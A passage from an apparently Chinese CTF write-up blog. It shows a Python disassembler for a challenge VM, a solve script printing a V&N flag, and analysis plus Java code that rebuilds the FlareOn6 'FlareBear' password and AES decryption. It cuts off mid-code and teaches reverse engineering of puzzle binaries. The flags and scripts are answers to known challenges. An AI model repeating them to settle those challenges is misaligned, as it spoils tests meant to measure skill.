class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">19</span>,<span class="number">4</span>,<span class="number">51</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;self((int)v118)&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">1</span>,<span class="number">54</span>,<span class="number">34</span>,<span class="string">&#x27;self(0x1000A880)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">54</span>]</span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">print(len(opc))</span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    ins = opc[eip]</span><br><span class="line">    print(<span class="string">&#x27;%02x:%02x:&#x27;</span>%(eip,ins),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&#x27;%X:&#x27;</span>%(add[ins]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ins==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;mov to tmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown4,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;move v4&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;add maybe&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x14</span>:</span><br><span class="line">        print(<span class="string">&#x27;xor&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x1c</span>:</span><br><span class="line">        print(<span class="string">&#x27;cmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x22</span>:</span><br><span class="line">        print(<span class="string">&#x27;real_unknown&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x25</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown3,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x27</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x29</span>:</span><br><span class="line">        print(<span class="string">&#x27;jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x2f</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown2,maybe jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x33</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe jump&#x27;</span>)</span><br><span class="line">    eip+=<span class="number">3</span></span><br></pre></td></tr></table></figure>

具体功能需要详细分析vm的结构

解题脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line">v118 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v118[<span class="number">0</span>] = <span class="number">81</span>;</span><br><span class="line">v118[<span class="number">1</span>] = <span class="number">95</span>;</span><br><span class="line">v118[<span class="number">2</span>] = <span class="number">114</span>;</span><br><span class="line">v118[<span class="number">3</span>] = <span class="number">105</span>;</span><br><span class="line">v118[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">v118[<span class="number">5</span>] = <span class="number">50</span>;</span><br><span class="line">v118[<span class="number">6</span>] = <span class="number">137</span>;</span><br><span class="line">v118[<span class="number">7</span>] = <span class="number">121</span>;</span><br><span class="line">v118[<span class="number">8</span>] = <span class="number">43</span>;</span><br><span class="line">v118[<span class="number">9</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">10</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">11</span>] = <span class="number">86</span>;</span><br><span class="line">v118[<span class="number">12</span>] = <span class="number">74</span>;</span><br><span class="line">v118[<span class="number">13</span>] = <span class="number">77</span>;</span><br><span class="line">v118[<span class="number">14</span>] = <span class="number">96</span>;</span><br><span class="line">v118[<span class="number">15</span>] = <span class="number">18</span>;</span><br><span class="line">v4 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">54</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">72</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">12</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">37</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">9</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">23</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">83</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">6</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">16</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">26</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">36</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">56</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">66</span>;</span><br><span class="line"></span><br><span class="line">f = [(v118[i]^v4[i])<span class="number">-2</span>^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">print(bytes(f))</span><br></pre></td></tr></table></figure>

```V&amp;N&#123;W&amp;M_Easy_Re&#125;
</code></pre>
<h2 id="rev-FlareOn6-FlareBear"><a href="#rev-FlareOn6-FlareBear" class="headerlink" title="[rev][FlareOn6]FlareBear"></a>[rev][FlareOn6]FlareBear</h2><ol>
<li><p>FlarebeerActivity</p>
</li>
<li><p>clean看到danceWithFlag可以获取flag，需要的条件为isHappy&amp;&amp;isEcstatic，继续分析条件</p>
</li>
<li><p>getState使用PreferenceManager.getDefaultSharedPreferences获取配置，并且下面有setState</p>
</li>
<li><p>isHappy: getStat(‘f’)/getStat(‘p’)&gt;2.0&amp;&amp;&lt;2.5<br>来自于getPreference(‘activity’,’’)</p>
</li>
<li><p>isEcstatic: getState(‘mass’,0)==72&amp;&amp;getState(‘happy’,0)==30&amp;&amp;getState(‘clean’,0)==0<br>来自于getPreference(argString,argInt)</p>
</li>
<li><p>decrypt函数：pawsitive_vibes!是初始向量，key是NaClNaClNaCl，key填充方式是PBKDF2WithHmacSHA1</p>
</li>
<li><p>getPassword: </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">String str1;</span><br><span class="line">    <span class="keyword">int</span> i = getStat(<span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> j = getStat(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> k = getStat(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String str3 = StringsKt.repeat(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">    String str4 = StringsKt.repeat(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">    String str5 = StringsKt.repeat(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    stringBuilder.append(str3);</span><br><span class="line">    stringBuilder.append(str1);</span><br><span class="line">    stringBuilder.append(str4);</span><br><span class="line">    stringBuilder.append(str2);</span><br><span class="line">    stringBuilder.append(str5);</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.toString();</span><br></pre></td></tr></table></figure>
<p> i/j&gt;2.0&lt;2.5，j=1,i=2,j=2,i=4,j=4,i=8,j=2,i=5<br> flare重复i/k次+str1+</p>
</li>
<li><p>解密资源</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.PBEKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">getPassword</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        String str1;</span><br><span class="line">        String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String str3 = repeatString(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">        String str4 = repeatString(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">        String str5 = repeatString(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        stringBuilder.append(str3);</span><br><span class="line">        stringBuilder.append(str1);</span><br><span class="line">        stringBuilder.append(str4);</span><br><span class="line">        stringBuilder.append(str2);</span><br><span class="line">        stringBuilder.append(str5);</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">rotN</span><span class="params">(String string, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Character&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;(string.length());</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; string.length(); i++) &#123;</span><br><span class="line">          <span class="keyword">char</span> c1 = string.charAt(i);</span><br><span class="line">          <span class="keyword">char</span> c = c1;</span><br><span class="line">          <span class="keyword">if</span> (Character.isLowerCase(c1)) &#123;</span><br><span class="line">            c1 = (<span class="keyword">char</span>)(c1 + n);</span><br><span class="line">            c = c1;</span><br><span class="line">            <span class="keyword">if</span> (c1 &gt; <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">              c = (<span class="keyword">char</span>)(c1 - n * <span class="number">2</span>); </span><br><span class="line">          &#125; </span><br><span class="line">          arrayList.add(Character.valueOf(c));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> array[] = <span class="keyword">new</span> <span class="keyword">char</span>[arrayList.size()];</span><br><span class="line">        i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:arrayList) &#123;</span><br><span class="line">            array[i++]=c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">repeatString</span><span class="params">(String string, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++) &#123;</span><br><span class="line">            sb.append(string);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(String key,<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Charset charset1 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte2 = <span class="string">&quot;pawsitive_vibes!&quot;</span>.getBytes(charset1);</span><br><span class="line">        IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(arrayOfByte2);</span><br><span class="line">        <span class="keyword">char</span>[] arrayOfChar = key.toCharArray();</span><br><span class="line">        Charset charset2 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte3 = <span class="string">&quot;NaClNaClNaCl&quot;</span>.getBytes(charset2);</span><br><span class="line">        PBEKeySpec pBEKeySpec = <span class="keyword">new</span> PBEKeySpec(arrayOfChar, arrayOfByte3, <span class="number">1234</span>, <span class="number">256</span>);</span><br><span class="line">        SecretKey secretKey = SecretKeyFactory.getInstance(<span class="string">&quot;PBKDF2WithHmacSHA1&quot;</span>).generateSecret(pBEKeySpec);</span><br><span class="line">        secretKey = <span class="keyword">new</span> SecretKeySpec(secretKey.getEncoded(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(<span class="number">2</span>, secretKey, ivParameterSpec);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte1 = cipher.doFinal(data);</span><br><span class="line">        <span class="keyword">return</span> arrayOfByte1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span 